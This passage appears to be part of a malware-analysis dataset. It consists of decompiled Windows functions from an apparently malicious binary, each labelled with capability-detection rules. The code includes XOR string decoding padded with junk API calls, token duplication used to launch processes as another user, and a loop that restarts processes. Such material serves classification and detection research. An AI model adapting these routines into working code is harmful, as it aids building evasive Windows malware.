  uStack564 = uVar6 >> 0x1f;\n    uStack568 = uVar6;\n    iStack552 = iVar8;\ncode_r0x00405a32:\n    iVar8 = iStack552;\n    uVar3 = uStack564;\n    uVar6 = uStack568;\n    if (*0x41dd10 == 0) {\n        piVar9 = &iStack528;\n        do {\n            iVar1 = *piVar9;\n            piVar9 = piVar9 + 1;\n        } while (iVar1 != 0);\n        if (piVar9 - auStack526 >> 1 != 0) {\n            uVar4 = (*_sym.imp.KERNEL32.dll_FindAtomW)(&iStack528);\n            (*_sym.imp.KERNEL32.dll_DeleteAtom)(uVar4);\n        }\n    }\n    else {\n        fcn.0040771e();\n        if ((iVar8 != 0) && ((uVar6 | uVar3) != 0)) {\n            fcn.0041045d();\n            fcn.00402f48((*0x41dac8 & 1) << 4);\n        }\n        uStack576 = *0x41dd10;\n        uStack572 = *0x41da90;\n        (*_sym.imp.KERNEL32.dll_WaitForMultipleObjects)(2, &uStack576, 0, 0xffffffff);\n        (*_sym.imp.KERNEL32.dll_Sleep)(5000);\n        (*_sym.imp.KERNEL32.dll_TerminateProcess)(*0x41dd10, 0);\n        uVar7 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.00405979, arg_8h, 0, 0);\n        pcVar2 = _sym.imp.KERNEL32.dll_CloseHandle;\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar7);\n        (*pcVar2)(*0x41dd10);\n    }\n    (*_sym.imp.KERNEL32.dll_ExitThread)(0);\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 953
    },
    "00405d3d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00405d3d(int32_t *arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *piVar4;\n    uint32_t uVar5;\n    uchar *puVar6;\n    \n    if (((*0x41dacc == 0) && (iVar2 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*0x41da90, 0xffffffff),  iVar2 == 0))\n       && (*arg_8h == 0x20)) {\n        puVar6 = 0x41db08;\n        for (iVar2 = 0x208; pcVar1 = _sym.imp.KERNEL32.dll_GetCurrentProcessId,  iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar6 = 0;\n            puVar6 = puVar6 + 1;\n        }\n        (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n        fcn.0040771e();\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xc);\n        piVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        piVar4[1] = arg_8h[2];\n        *piVar4 = arg_8h[1];\n        iVar2 = (*pcVar1)();\n        piVar4[2] = iVar2;\n        uVar3 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.00405979, piVar4, 0, 0);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar3);\n    }\n    uVar5 = 0;\n    do {\n        str.bIG0iEw66qDxx[uVar5 + 0xc] = str.bIG0iEw66qDxx[uVar5 + 0xc] ^ \"5ITi6oOtv\"[uVar5 % 9];\n        uVar5 = uVar5 + 1;\n    } while (uVar5 < 0x4400);\n    uVar5 = 0;\n    do {\n        *(uVar5 + 0x417880) = *(uVar5 + 0x417880) ^ str.bIG0iEw66qDxx[uVar5 % 0xc];\n        uVar5 = uVar5 + 1;\n    } while (uVar5 < 0x6200);\n    uVar3 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.00408022, 0, 0, 0);\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar3);\n    pcVar1 = _sym.imp.KERNEL32.dll_Sleep;\n    while (*0x41dd5c == 0) {\n        fcn.004053db();\n        if (*0x41dacc != 0) {\n            (*pcVar1)(1000);\n        }\n        (*pcVar1)(0x1e);\n    }\n    return 0;\n}\n",
        "token_count": 688
    },
    "004075ae": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.004075ae(uint *param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    uint lpCommandLine;\n    uint var_9ch;\n    uint *var_58h;\n    int32_t var_54h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_17h;\n    uint var_13h;\n    uint var_fh;\n    uint var_bh;\n    uint var_4h;\n    \n    var_4ch = 0x61026b40;\n    iVar5 = 0x44;\n    var_48h = 0x6b16570d;\n    puVar6 = param_1;\n    for (iVar4 = 0x10; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    var_44h = 0x57116125;\n    var_40h = 0x61036b08;\n    puVar6 = &var_9ch;\n    var_58h = param_1;\n    for (; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    var_9ch = 0x44;\n    var_3ch = 0x6b0a571b;\n    puVar6 = &lpCommandLine;\n    for (iVar4 = 0x208; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    var_38h = 0x57516125;\n    var_34h = 0x61226b39;\n    var_30h = 0x6b16570d;\n    var_2ch = 0x57116125;\n    var_28h = 0x61626b08;\n    var_24h = 0x6b395746;\n    var_20h = 0x57026122;\n    var_54h = 6;\n    var_1ch._0_1_ = 6;\n    stack0xffffffe1 = 0x1b61396b;\n    var_17h = 0x256b1657;\n    var_13h = 0x575a61;\n    var_fh = 0x1161296b;\n    var_bh._0_2_ = 0x6557;\n    var_bh._2_1_ = 0x6b;\n    stack0xfffffff4 = 0x61516b65;\n    var_4h._0_2_ = 0x5774;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x89);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar5 = 0;\n    do {\n        iVar2 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n        if (iVar2 != 0x836777) {\n            *(iVar5 + iVar4) = *(&var_bh + iVar5 % var_54h + 3) ^ (iVar5 + iVar4)[&var_4ch - iVar4];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x44);\n    (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(iVar4, &lpCommandLine, 0x104);\n    puVar6 = var_58h;\n    (*_sym.imp.KERNEL32.dll_CreateProcessW)(0, &lpCommandLine, 0, 0, 0, 0x800000c, 0, 0, &var_9ch, var_58h);\n    if (puVar6[1] != 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(puVar6[1]);\n    }\n    uVar1 = *puVar6;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    return uVar1;\n}\n",
        "token_count": 1055
    },
    "00407970": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00407970(uint *param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint lpCommandLine;\n    uint var_44h;\n    \n    iVar2 = 0x44;\n    puVar3 = param_1;\n    for (iVar1 = 0x10; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    puVar3 = &var_44h;\n    for (; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    var_44h = 0x44;\n    puVar3 = &lpCommandLine;\n    for (iVar1 = 0x208; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    (*_sym.imp.USER32.dll_wsprintfW)(&lpCommandLine, 0x4117b0, *0x41da98);\n    (*_sym.imp.KERNEL32.dll_CreateProcessW)(0, &lpCommandLine, 0, 0, 0, 0, 0, 0, &var_44h, param_1);\n    if (param_1[1] != 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(param_1[1]);\n    }\n    return *param_1;\n}\n",
        "token_count": 362
    },
    "00407d4b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00407d4b(uint noname_0, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    int16_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint *puVar9;\n    uint var_324h;\n    uint var_11ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar9 = &var_11ch;\n    for (iVar7 = 0x104; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    puVar9 = &var_324h;\n    for (iVar7 = 0x208; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    if (*0x41dacc == 0) {\n        uVar6 = 0;\n        do {\n            if (*(uVar6 + 0x411380) == arg_ch) {\n                if (arg_10h == *0x41daa0) {\n                    return 1;\n                }\n                if (arg_ch == -0x37b0bf10) {\n                    puVar9 = &var_11ch;\n                    for (iVar7 = 0x104; iVar7 != 0; iVar7 = iVar7 + -1) {\n                        *puVar9 = 0;\n                        puVar9 = puVar9 + 1;\n                    }\n                    var_11ch._0_1_ = 0;\n                    if ((arg_14h != 0) &&\n                       (iVar7 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x100410, 0, arg_14h),  iVar7 != 0)) {\n                        (*_sym.imp.PSAPI.DLL_GetProcessImageFileNameA)(iVar7, &var_11ch, 0x104);\n                        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar7);\n                    }\n                    pcVar5 = _sym.imp.KERNEL32.dll_lstrlenA;\n                    iVar7 = (*_sym.imp.KERNEL32.dll_lstrlenA)(&var_11ch);\n                    if (iVar7 != 0) {\n                        (*pcVar5)(&var_11ch);\n                        iVar7 = fcn.00401235();\n                        if (iVar7 == -0x37b0bf10) {\n                            return 1;\n                        }\n                    }\n                }\n                iVar7 = fcn.00407cf7();\n                if (iVar7 != 0) {\n                    return 1;\n                }\n                puVar9 = &var_324h;\n                for (iVar7 = 0x208; iVar7 != 0; iVar7 = iVar7 + -1) {\n                    *puVar9 = 0;\n                    puVar9 = puVar9 + 1;\n                }\n                iVar7 = fcn.0040771e();\n                if (iVar7 == 0) {\n                    return 1;\n                }\n                iVar7 = (*_sym.imp.SHLWAPI.dll_StrCmpIW)(&var_324h, 0x41db08);\n                if (iVar7 != 0) {\n                    return 1;\n                }\n                uVar2 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.004055fa, arg_10h, 0, 0);\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar2);\n                return 1;\n            }\n            uVar6 = uVar6 + 4;\n        } while (uVar6 < 0x1c);\n    }\n    else if ((((arg_ch == 0x74fc6984) && (iVar7 = fcn.00407cf7(),  iVar7 == 0)) && (iVar7 = fcn.0040771e(),  iVar7 != 0)\n             ) && (iVar1 = (*_sym.imp.KERNEL32.dll_FindAtomW)(&var_324h),  iVar1 == 0)) {\n        var_18h = 0x23101c5e;\n        var_14h = 0x504a5950;\n        var_10h = 0x15595163;\n        var_ch._0_1_ = 0x62;\n        var_8h = 0x4d627935;\n        var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x35);\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xe);\n        iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        iVar8 = 0;\n        do {\n            iVar3 = (*_sym.imp.USER32.dll_GetCaretBlinkTime)();\n            if (iVar3 != 0x2d0487) {\n                *(iVar8 + iVar7) = *(&var_8h + iVar8 % 5) ^ (iVar8 + iVar7)[&var_18h - iVar7];\n            }\n            iVar8 = iVar8 + 1;\n        } while (iVar8 < 0xd);\n        var_14h = 0x32542135;\n        var_10h = 0x1219283f;\n        var_ch._0_1_ = 0x30;\n        var_8h = 0x73304574;\n        var_4h._0_2_ = 0x474b;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 10);\n        iVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        iVar3 = 0;\n        do {\n            iVar4 = (*_sym.imp.USER32.dll_GetDesktopWindow)();\n            if (iVar4 != 0x9b7d45) {\n                *(iVar3 + iVar8) = *(&var_8h + iVar3 % 6) ^ (iVar3 + iVar8)[&var_14h - iVar8];\n            }\n            iVar3 = iVar3 + 1;\n        } while (iVar3 < 9);\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar7, iVar8);\n        pcVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n        (*pcVar5)(&var_324h);\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xc);\n        iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        *(iVar3 + 8) = arg_10h;\n        uVar2 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.004081f7, iVar3, 0, 0);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar2);\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar8);\n        pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar7);\n        (*pcVar5)(uVar2);\n    }\n    return 1;\n}\n",
        "token_count": 1709
    },
    "004081f7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004081f7(uint arg_8h)\n\n{\n    int16_t iVar1;\n    code *pcVar2;\n    ushort uVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int16_t *piVar6;\n    uchar *puVar7;\n    uchar *puStack572;\n    int32_t iStack552;\n    uint uStack548;\n    uchar auStack544 [16];\n    int16_t iStack528;\n    uchar auStack526 [522];\n    \n    puVar7 = &stack0xfffffde0;\n    for (iVar5 = 0x10; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    puVar7 = &stack0xfffffdf0;\n    for (iVar5 = 0x208; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    if (*0x41dacc == 0) {\n        puStack572 = 0x40823e;\n        *0x41dd10 = fcn.00407970();\n    }\n    else {\n        puStack572 = 0x408233;\n        *0x41dd10 = fcn.004056d2();\n    }\n    if (*0x41dd10 == 0) {\n        piVar6 = &stack0xfffffdf0;\n        do {\n            iVar1 = *piVar6;\n            piVar6 = piVar6 + 1;\n        } while (iVar1 != 0);\n        if (piVar6 - &stack0xfffffdf2 >> 1 != 0) {\n            puStack572 = &stack0xfffffdf0;\n            uVar3 = (*_sym.imp.KERNEL32.dll_FindAtomW)();\n            (*_sym.imp.KERNEL32.dll_DeleteAtom)(uVar3);\n        }\n    }\n    else {\n        puStack572 = 0x408252;\n        fcn.0040771e();\n        iStack552 = *0x41dd10;\n        puStack572 = 0xffffffff;\n        uStack548 = *0x41da90;\n        (*_sym.imp.KERNEL32.dll_WaitForMultipleObjects)(2, &stack0xfffffdd8, 0);\n        puStack572 = NULL;\n        (*_sym.imp.KERNEL32.dll_GetExitCodeProcess)(*0x41dd10, &stack0xfffffdc4);\n        (*_sym.imp.KERNEL32.dll_Sleep)(5000);\n        (*_sym.imp.KERNEL32.dll_TerminateProcess)(*0x41dd10, 0);\n        uVar4 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.004081f7, arg_8h, 0, 0);\n        pcVar2 = _sym.imp.KERNEL32.dll_CloseHandle;\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar4);\n        (*pcVar2)(*0x41dd10);\n    }\n    puStack572 = NULL;\n    (*_sym.imp.KERNEL32.dll_ExitThread)();\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 722
    },
    "004082fd": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __fastcall fcn.004082fd(uint param_1, int32_t *param_2)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    code *pcVar7;\n    int32_t *piVar8;\n    uint *puVar9;\n    uint lpCommandLine;\n    int32_t var_b0h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_70h;\n    uint var_6ch;\n    int32_t var_68h;\n    int32_t var_64h;\n    uint var_60h;\n    uint TokenHandle;\n    uint var_58h;\n    uint pSessionId;\n    uint hExistingToken;\n    uint pSid;\n    uint var_48h;\n    uint var_44h;\n    uint pIdentifierAuthority;\n    uint var_3ch;\n    int32_t *var_38h;\n    int32_t var_34h;\n    int32_t var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint hToken;\n    \n    var_58h = 4;\n    var_3ch._0_2_ = 0x1000;\n    piVar8 = param_2;\n    for (iVar6 = 0x10; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *piVar8 = 0;\n        piVar8 = piVar8 + 1;\n    }\n    pSessionId = 0;\n    puVar9 = &lpCommandLine;\n    var_38h = param_2;\n    for (iVar6 = 0x44; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    hToken = 0;\n    puVar9 = &var_70h;\n    for (iVar6 = 8; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    hExistingToken = 0;\n    var_30h = 0;\n    pSid = 0;\n    pIdentifierAuthority = 0;\n    iVar6 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x2000000, 0, param_1);\n    if (iVar6 != 0) {\n        var_68h = iVar6;\n        iVar2 = (*_sym.imp.KERNEL32.dll_ProcessIdToSessionId)(param_1, &pSessionId);\n        pcVar7 = _sym.imp.KERNEL32.dll_CloseHandle;\n        if (iVar2 != 0) {\n            iVar2 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(iVar6, 0x201eb, &hExistingToken);\n            if (iVar2 != 0) {\n                fcn.00405e5f();\n                iVar2 = (*_sym.imp.ADVAPI32.dll_DuplicateTokenEx)(hExistingToken, 0x2000000, 0, 1, 1, &hToken);\n                pcVar1 = _sym.imp.ADVAPI32.dll_SetTokenInformation;\n                if (iVar2 != 0) {\n                    (*_sym.imp.ADVAPI32.dll_SetTokenInformation)(hToken, 0xc, pSessionId, 4);\n                    iVar6 = (*_sym.imp.ADVAPI32.dll_AllocateAndInitializeSid)\n                                      (&pIdentifierAuthority, 1, 0x4000, 0, 0, 0, 0, 0, 0, 0, &pSid);\n                    if (iVar6 != 0) {\n                        var_6ch = 0x20;\n                        var_70h = pSid;\n                        iVar6 = (*_sym.imp.ADVAPI32.dll_GetLengthSid)(pSid);\n                        (*pcVar1)(hToken, 0x19, &var_70h, iVar6 + 8);\n                        (*_sym.imp.ADVAPI32.dll_FreeSid)(pSid);\n                    }\n                    var_60h = 0;\n                    (*pcVar1)(hToken, 0x1b, &var_60h, 4);\n                    iVar6 = (*_sym.imp.USERENV.dll_CreateEnvironmentBlock)(&var_30h, hToken, 1);\n                    if (iVar6 == 0) {\n                        var_30h = 0;\n                    }\n                    else {\n                        var_58h = 0x404;\n                    }\n                    lpCommandLine = 0x44;\n                    var_24h = 0x41224a34;\n                    var_20h = 0x4a30735f;\n                    var_1ch = 0x7350413f;\n                    var_18h = 0x41174a73;\n                    var_14h = 0x4a267355;\n                    var_10h = 0x7350412d;\n                    var_ch = 0x41274a36;\n                    var_8h = 0x4a437345;\n                    var_48h = 0x414b4a43;\n                    var_44h._0_2_ = 0x7331;\n                    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x41);\n                    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                    iVar2 = 0;\n                    var_34h = &var_24h - iVar6;\n                    var_64h = iVar6;\n                    do {\n                        iVar4 = (*_sym.imp.USER32.dll_CloseClipboard)();\n                        if (iVar4 != 0xa033fa) {\n                            var_2ch = 6;\n                            *(iVar2 + iVar6) = *(&var_48h + iVar2 % 6) ^ (iVar2 + iVar6)[var_34h];\n                        }\n                        iVar2 = iVar2 + 1;\n                    } while (iVar2 < 0x20);\n                    var_1ch = 0x314f4409;\n                    var_18h = 0x392c7a0b;\n                    var_14h = 0x4409685e;\n                    var_10h = 0x7a46314d;\n                    var_ch = 0x68493921;\n                    var_8h = 0x3139441f;\n                    var_2ch = 0x3139447a;\n                    var_28h._0_1_ = 0x68;\n                    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x31);\n                    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                    iVar2 = 0;\n                    var_34h = &var_1ch - iVar6;\n                    do {\n                        iVar5 = (*_sym.imp.USER32.dll_GetDoubleClickTime)();\n                        iVar4 = var_64h;\n                        if (iVar5 != 0xd063f8) {\n                            var_34h = 5;\n                            *(iVar2 + iVar6) = *(&var_2ch + iVar2 % 5) ^ (iVar2 + iVar6)[&var_1ch - iVar6];\n                        }\n                        iVar2 = iVar2 + 1;\n                    } while (iVar2 < 0x18);\n                    var_88h._0_2_ = 0;\n                    var_b0h = var_64h;\n                    var_8ch = 1;\n                    (*_sym.imp.ADVAPI32.dll_CreateProcessAsUserW)\n                              (hToken, iVar6, 0, 0, 0, 0, var_58h, var_30h, 0, &lpCommandLine, var_38h);\n                    pcVar7 = _sym.imp.KERNEL32.dll_CloseHandle;\n                    if (*var_38h != 0) {\n                        iVar2 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(*var_38h, 0x201eb, &TokenHandle);\n                        if (iVar2 != 0) {\n                            fcn.00405e5f();\n                            (*pcVar7)(TokenHandle);\n                        }\n                        (*pcVar7)(var_38h[1]);\n                    }\n                    if (var_30h != 0) {\n                        (*_sym.imp.USERENV.dll_DestroyEnvironmentBlock)(var_30h);\n                    }\n                    (*pcVar7)(hToken);\n                    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n                    pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n                    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n                    (*pcVar1)(uVar3);\n                    param_2 = var_38h;\n                    iVar6 = var_68h;\n                }\n                (*pcVar7)(hExistingToken);\n            }\n        }\n        (*pcVar7)(iVar6);\n    }\n    return *param_2;\n}\n",
        "token_count": 2078
    },
    "00408747": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __fastcall fcn.00408747(int32_t param_1)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    var_4h = 0;\n    var_14h = param_1;\n    if (*0x41dd1c == NULL) {\n        var_2ch = 0x21340719;\n        var_28h = 0x3340663c;\n        var_24h = 0x1133243c;\n        var_20h._0_2_ = 0x3d10;\n        var_20h._2_1_ = 0x4b;\n        var_1ch = 0x4e637450;\n        var_18h._0_1_ = 0x4b;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x10);\n        iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        var_8h = 5;\n        iVar7 = 0;\n        var_10h = iVar4;\n        do {\n            iVar5 = (*_sym.imp.USER32.dll_CloseClipboard)();\n            if (iVar5 != 0xd28946) {\n                *(iVar7 + iVar4) = *(&var_1ch + iVar7 % var_8h) ^ (iVar7 + iVar4)[&var_2ch - iVar4];\n            }\n            iVar7 = iVar7 + 1;\n        } while (iVar7 < 0xf);\n        var_2ch = 0x23101c5e;\n        var_28h = 0x504a5950;\n        var_24h = 0x15595163;\n        var_20h._0_2_ = CONCAT11(var_20h._1_1_, 0x62);\n        var_1ch = 0x4d627935;\n        var_18h._0_1_ = 0x35;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xe);\n        iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        iVar7 = 0;\n        var_ch = &var_2ch - iVar4;\n        do {\n            iVar6 = (*_sym.imp.USER32.dll_GetCaretBlinkTime)();\n            iVar5 = var_10h;\n            if (iVar6 != 0x2d0487) {\n                *(iVar7 + iVar4) = *(&var_1ch + iVar7 % var_8h) ^ (iVar7 + iVar4)[&var_2ch - iVar4];\n            }\n            iVar7 = iVar7 + 1;\n        } while (iVar7 < 0xd);\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar4, var_10h);\n        *0x41dd1c = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar3);\n        pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n        pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        uVar3 = (*pcVar2)(0, iVar5);\n        (*pcVar1)(uVar3);\n        if (*0x41dd1c == NULL) {\n            return var_4h;\n        }\n    }\n    if ((var_14h != 0) && (iVar4 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x400, 0, var_14h),  iVar4 != 0)) {\n        iVar7 = (**0x41dd1c)(iVar4, &var_4h);\n        var_4h = var_4h & -(iVar7 != 0);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar4);\n    }\n    return var_4h;\n}\n",
        "token_count": 1018
    },
    "00408e74": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00408e74(uint32_t arg_8h, uint32_t *arg_ch)\n\n{\n    char cVar1;\n    code *pcVar2;\n    uchar *arg_8h_00;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    int32_t *piVar9;\n    int32_t *in_EDX;\n    code *pcVar10;\n    int32_t iVar11;\n    uchar *puVar12;\n    int32_t *piVar13;\n    uint var_a8h;\n    uint var_a0h;\n    int32_t var_78h;\n    int32_t var_74h;\n    uint32_t var_70h;\n    int32_t *var_6ch;\n    int32_t var_68h;\n    uint var_64h;\n    int32_t var_60h;\n    int32_t var_5ch;\n    int32_t var_58h;\n    int32_t var_54h;\n    uint32_t var_50h;\n    uint var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    uint var_34h;\n    uchar var_30h;\n    uint 